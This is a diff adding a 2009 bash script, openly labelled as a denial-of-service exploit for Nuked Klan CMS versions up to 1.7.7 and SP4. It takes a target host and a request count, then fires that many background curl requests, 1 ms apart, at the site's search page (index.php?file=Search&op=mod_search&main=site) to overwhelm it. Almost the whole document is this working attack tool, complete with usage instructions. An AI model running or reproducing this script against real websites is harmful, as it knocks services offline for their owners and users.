@@ -1,0 +1,34 @@
+#!/bin/bash
+# Nuked KLan <= 1.7.7 & <= SP4 DOS
+# Copyright 2009 ; Hamza 'MizoZ' N. <mizozx[at]gmail[dot]com>
+#
+# Needs : cURL
+# This is a DOS issue for Nuked Klan <= 1.7.7 & <= SP4 ,
+# it uses multiple requests on the search page .
+#
+# Tested on Windows Sv 2008 & Gentoo 8.1
+
+show() {
+  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+  echo "Nuked KLan <= 1.7.7 & <= SP4 DOS"
+  echo "Author : Hamza 'MIzoZ' N. < mizozx[at]gmail[dot]com"
+  echo "Usage  : sh $0 -h [HOST] -r 1000"
+  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+  echo ""
+}
+
+while [[ $# != 0 ]]; do
+    arg_name=$1; shift
+    case "$arg_name" in
+      -h) host=$1; shift;;
+      -r) requests=$1; shift;;
+      *) echo "invalid option: $1"; show;exit 1;;
+    esac
+done
+
+[ -z "$host" ] && { show; exit 1; }
+for random in `seq 1 $requests`; do
+curl -A Firefox -o --url "$host/index.php?file=Search&op=mod_search&main=site" > /dev/null 2>&1 &
+sleep 0.001;
+echo "~~";
+done
